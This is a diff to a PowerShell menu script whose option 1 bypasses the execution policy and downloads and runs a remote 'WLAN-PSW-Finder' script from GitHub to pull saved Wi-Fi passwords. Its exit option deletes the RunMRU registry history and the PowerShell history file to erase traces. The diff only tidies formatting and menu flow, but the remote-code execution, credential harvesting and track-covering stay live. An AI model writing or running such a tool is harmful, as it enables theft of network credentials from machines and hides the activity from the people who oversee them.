@@ -6,15 +6,15 @@ function Show-Menu {
     Write-Host " -------------------------------------------------- "
     Write-Host "0. Exit"
     Write-Host "1. Find saved WLAN passwords"
- 
+
     Write-Host
     $choice = Read-Host "Enter your choice"
 
     # Process user input
     switch ($choice) {
         "0" { Run-Script0 }
-        "1" { Run-Script1 }
-        default { 
+        "1" { Run-Script1; Press-AnyKey; Show-Menu }
+        default {
             Write-Host "Invalid choice. Please try again."
             Show-Menu
         }
@@ -26,17 +26,16 @@ function Run-Script0 {
     Write-Host "Clearing execution history..."
     cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\
     Remove-Item .\RunMRU\
-    
-    Write-Host "Clearing powershell history..."
-    Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+    Write-Host "Clearing PowerShell history..."
+    Remove-Item (Get-PSReadlineOption).HistorySavePath
 
     Write-Host "Goodbye"
     exit
 }
 
-function Run-Script1 {   
+function Run-Script1 {
     powershell -ExecutionPolicy Bypass -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/error404eu/Scripts/main/WLAN-PSW-Finder.ps1').Content);pause"
-    Press-AnyKey
 }
 
 # Helper function to prompt user to press any key
